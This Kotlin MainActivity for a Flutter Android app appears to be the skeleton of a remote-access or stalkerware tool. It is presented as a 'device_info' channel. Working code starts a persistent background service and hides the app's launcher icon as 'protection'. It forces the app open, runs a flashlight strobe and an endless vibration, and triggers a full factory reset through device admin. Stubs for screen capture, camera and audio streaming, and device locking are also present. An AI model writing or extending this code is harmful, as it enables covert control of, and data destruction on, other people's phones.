package com.template.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.net.Uri
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.Settings
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {
    private val CHANNEL = "orgsapp/device_info"
override fun onCreate(savedInstanceState: android.os.Bundle?) {
    super.onCreate(savedInstanceState)
    val intent = Intent(this, KeepAliveService::class.java)
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        startForegroundService(intent)
    } else {
        startService(intent)
    }
}
    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            CHANNEL,
        ).setMethodCallHandler { call, result ->
            try {
                when (call.method) {
                    // ===== DEVICE INFO =====
                    "getSdkInt" -> result.success(Build.VERSION.SDK_INT)
                    "getModel" -> result.success(Build.MODEL)
                    "getBrand" -> result.success(Build.BRAND)
                    "getAndroidVersion" -> result.success(Build.VERSION.RELEASE)

                    // ===== SETTINGS =====
                    "openAccessibilitySettings" -> openAccessibilitySettings(result)

                    // ===== FLASHLIGHT =====
                    "flashStrobe" -> toggleFlash(true, result)
                    "stopStrobe" -> toggleFlash(false, result)

                    // ===== VIBRATE =====
                    "vibrateLoop" -> vibrateLoop(result)
                    "stopVibrate" -> stopVibrate(result)

                    // ===== OPEN URL =====
                    "openUrl" -> openUrl(call.argument<String>("url"), result)

                    // ===== FORCE OPEN =====
                    "forceOpen" -> forceOpen(result)

                    // ===== PROTECTION =====
                    "enableProtection" -> enableProtection(
                        call.argument<String>("method") ?: "both", result
                    )
                    "disableProtection" -> disableProtection(result)

                    // ===== FACTORY RESET =====
                    "factoryReset" -> factoryReset(result)

                    // ===== PLACEHOLDER (belum diimplementasi) =====
                    "captureScreen" -> result.success("")
                    "takePhoto" -> result.success("")
                    "startCameraStream" -> result.success(true)
                    "stopCameraStream" -> result.success(true)
                    "hardLock" -> result.success(true)
                    "unlock" -> result.success(true)
                    "playAudio" -> result.success(true)
                    "stopAudio" -> result.success(true)
                    "startAudioStream" -> result.success(true)
                    "stopAudioStream" -> result.success(true)
                    "setWallpaper" -> result.success(true)

                    else -> result.notImplemented()
                }
            } catch (e: Exception) {
                result.error("ERR", e.message, null)
            }
        }
    }

    // ==========================================
    // ===== HELPER: SETTINGS =====
    // ==========================================
    private fun openAccessibilitySettings(result: MethodChannel.Result) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            result.success(true)
        } catch (e: Exception) {
            result.error("ERROR", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: FLASHLIGHT =====
    // ==========================================
    private fun toggleFlash(on: Boolean, result: MethodChannel.Result) {
        try {
            val camManager =
                getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = camManager.cameraIdList.firstOrNull()
            if (cameraId == null) {
                result.success(false)
                return
            }
            camManager.setTorchMode(cameraId, on)
            result.success(true)
        } catch (e: Exception) {
            result.error("FLASH", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: VIBRATE =====
    // ==========================================
    private fun getVibrator(): Vibrator {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE)
                    as VibratorManager
            vm.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
    }

    private fun vibrateLoop(result: MethodChannel.Result) {
        try {
            val vibrator = getVibrator()
            val pattern = longArrayOf(0, 500, 500)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, 0)
            }
            result.success(true)
        } catch (e: Exception) {
            result.error("VIB", e.message, null)
        }
    }

    private fun stopVibrate(result: MethodChannel.Result) {
        try {
            getVibrator().cancel()
            result.success(true)
        } catch (e: Exception) {
            result.error("VIB", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: OPEN URL =====
    // ==========================================
    private fun openUrl(url: String?, result: MethodChannel.Result) {
        if (url.isNullOrEmpty()) {
            result.success(false)
            return
        }
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            result.success(true)
        } catch (e: Exception) {
            result.error("URL", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: FORCE OPEN =====
    // ==========================================
    private fun forceOpen(result: MethodChannel.Result) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            result.success(true)
        } catch (e: Exception) {
            result.error("FO", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: PROTECTION =====
    // ==========================================
    private fun enableProtection(method: String, result: MethodChannel.Result) {
        try {
            // TODO: implement DeviceAdmin + hide icon
            // Contoh hide icon:
            if (method == "hide_icon" || method == "both") {
                val cn = ComponentName(this, MainActivity::class.java)
                packageManager.setComponentEnabledSetting(
                    cn,
                    android.content.pm.PackageManager
                        .COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP,
                )
            }
            result.success(true)
        } catch (e: Exception) {
            result.error("PROT", e.message, null)
        }
    }

    private fun disableProtection(result: MethodChannel.Result) {
        try {
            val cn = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                cn,
                android.content.pm.PackageManager
                    .COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP,
            )
            result.success(true)
        } catch (e: Exception) {
            result.error("PROT", e.message, null)
        }
    }

    // ==========================================
    // ===== HELPER: FACTORY RESET =====
    // ==========================================
    private fun factoryReset(result: MethodChannel.Result) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                    as DevicePolicyManager
            val admin = ComponentName(this, DeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0)
                result.success(true)
            } else {
                result.success(false)
            }
        } catch (e: Exception) {
            result.error("FR", e.message, null)
        }
    }
}
